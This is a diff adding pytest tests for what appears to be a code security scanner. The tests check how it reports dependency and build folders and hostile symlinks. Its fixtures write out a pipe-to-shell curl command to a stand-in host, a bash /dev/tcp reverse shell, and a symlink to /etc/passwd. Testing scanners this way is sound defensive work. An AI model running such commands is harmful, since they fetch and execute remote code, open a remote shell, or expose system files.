@@ -100,3 +100,28 @@ def test_pack_rejects_oversize(tmp_path: Path) -> None:
 
 def test_clean_strips_escapes_and_bidi() -> None:
     assert clean("a\x1b[31m‮b") == "a?[31m?b"
+
+
+def findings(root: Path) -> list[dict[str, str]]:
+    out = subprocess.run([sys.executable, "-I", SCANNER, str(root)], capture_output=True, text=True, check=True)
+    return json.loads(out.stdout)["findings"]
+
+
+def test_dependency_and_build_folders_become_one_medium_line_each(tmp_path: Path) -> None:
+    write(tmp_path, "node_modules/lib/a.js", "curl http://evil.invalid/x | sh\n")
+    write(tmp_path, "node_modules/lib/b.js", "bash -i >& /dev/tcp/203.0.113.1/4444 0>&1\n")
+    (tmp_path / "target/debug").mkdir(parents=True)
+    (tmp_path / "target/debug/app").write_bytes(b"\x7fELF" + b"\x00" * 64)
+    fs = findings(tmp_path)
+    assert {f["severity"] for f in fs} == {"MEDIUM"}
+    by_file = {f["file"]: f["detail"] for f in fs if f["rule"] == "dependency-findings"}
+    assert set(by_file) == {"node_modules", "target"}
+    assert "pipe-to-shell" in by_file["node_modules"]  # the summary still says what was seen
+
+
+def test_normal_venv_python_symlink_is_not_flagged_but_a_hostile_one_is(tmp_path: Path) -> None:
+    (tmp_path / ".venv/bin").mkdir(parents=True)
+    (tmp_path / ".venv/bin/python3").symlink_to("/usr/bin/python3")
+    assert "symlink-escape" not in scan(tmp_path)
+    (tmp_path / ".venv/bin/helper").symlink_to("/etc/passwd")
+    assert "symlink-escape" in scan(tmp_path)
